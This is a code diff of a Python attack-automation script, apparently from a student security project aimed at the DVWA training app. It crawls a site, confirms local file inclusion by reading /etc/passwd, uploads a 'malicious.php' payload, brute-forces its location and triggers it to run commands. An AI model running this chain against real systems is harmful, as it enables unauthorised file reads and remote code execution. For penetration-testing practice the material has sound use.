@@ -7,16 +7,23 @@ import crawler
 import lfi
 import uploadv2
 
+# Fictional Company
+# URL = "http://ict2214p1b2.mooo.com/"
+# COOKIE = {"PHPSESSID": "t9i6h0t3p3vu491qg86qrsispc"}
+# PAYLOAD_FILENAME = "test.php"
 
-URL = "http://ict2214p1b2.mooo.com/" #"http://192.168.52.129/DVWA/"
-#UPLOAD_DIR = f"{URL}hackable/uploads/"
+# DVWA
+URL = "http://127.0.0.1/DVWA/"
+COOKIE = {
+    'PHPSESSID': '592650b8ta6dts0u0orun6jj25',
+    'security': 'medium'
+}
+PAYLOAD_FILENAME = "malicious.php"
+
+# UPLOAD_DIR = f"{URL}hackable/uploads/"
 UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
-COOKIE = {
-    'PHPSESSID': 'ij9qqj2c6ui367p38hqjtik5ju'
-}
 
-PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
 
 
@@ -34,9 +41,10 @@ def generate_report(uploaded_url, lfi_url, command_results):
         f.write(report)
     print(f"[+] Report generated: {REPORT_FILENAME}")
 
+
 def main():
     session = requests.Session()
-    
+
     # Main function
     found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
     print("Crawling complete.")
@@ -51,8 +59,15 @@ def main():
         print("[+] " + url)
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
-
-     # Generate the payloads
+    
+    lfi_confirmed_targets = set()
+    for target in lfi_targets:
+        print(target)
+        result = lfi.show_passwd(target, COOKIE)
+        if result:
+            lfi_confirmed_targets.add(target)
+    
+    # Generate the payloads
     payload_filenames = uploadv2.create_payloads()
 
     # Use dynamic wordlists to determine endpoints:
@@ -65,8 +80,9 @@ def main():
         if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
             print(f"[+] File upload Success. URL: {url}.")
 
-    
-    dynamic_upload_dir = uploadv2.get_upload_directory(URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE)
+    dynamic_upload_dir = uploadv2.get_upload_directory(
+        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
+    )
     # print(f"Dynamic Upload URL: {dynamic_upload_url}")
     print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
 
@@ -77,24 +93,24 @@ def main():
     # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
-    # # --- LFI Brute Force and Trigger Phase ---
-    # payload_relative = dynamic_upload_dir + PAYLOAD_FILENAME  # full URL for the file (from base)
-    # lfi_found_url = None
-    # for target in lfi_targets:
-    #     lfi_found_url = lfi.brute_force_lfi(target, payload_relative, session, COOKIE)
-    #     if lfi_found_url:
-    #         break
+    # --- LFI Brute Force Phase ---
+    lfi_found_url = None
+    for target in lfi_confirmed_targets:
+        print("Brute forcing LFI now")
+        lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, session, COOKIE)
+        if lfi_found_url:
+            break
 
-    # # --- Trigger Payload Phase ---
-    # if lfi_found_url:
-    #     command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
-    # else:
-    #     print("[-] Could not locate the uploaded file via LFI.")
-    #     command_results = ""
+    # --- Trigger Payload Phase ---
+    if lfi_found_url:
+        command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
+    else:
+        print("[-] Could not locate the uploaded file via LFI.")
+        command_results = ""
 
     # # --- Report Generation ---
     # generate_report(direct_file_url, lfi_found_url, command_results)
-    
+
 
 if __name__ == "__main__":
     main()
